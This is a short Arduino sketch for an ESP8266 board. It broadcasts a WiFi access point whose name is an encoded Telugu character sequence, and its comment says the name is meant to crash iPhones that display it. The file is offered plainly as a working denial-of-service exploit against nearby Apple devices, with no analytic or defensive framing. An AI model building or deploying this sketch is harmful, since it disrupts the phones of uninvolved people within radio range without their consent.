#include <ESP8266WiFi.h>
#include <WiFiClient.h>
/*
   Alireza Zare
   Info.Ali.Pci@Gmail.com
   Github : https://github.com/alirezapci
   twitter : @alireza__zare
*/

const char *ssid = "\xe0\xb0\x9c\xe0\xb1\x8d\xe0\xb0\x9e\xe2\x80\x8c\xe0\xb0\xbe"; // SSID Name = Single indian character for crash iphones
const char *password = "jhjjh7867687tgyguy"; // random password
void setup() {

  WiFi.softAP(ssid, password);
}
void loop() {}

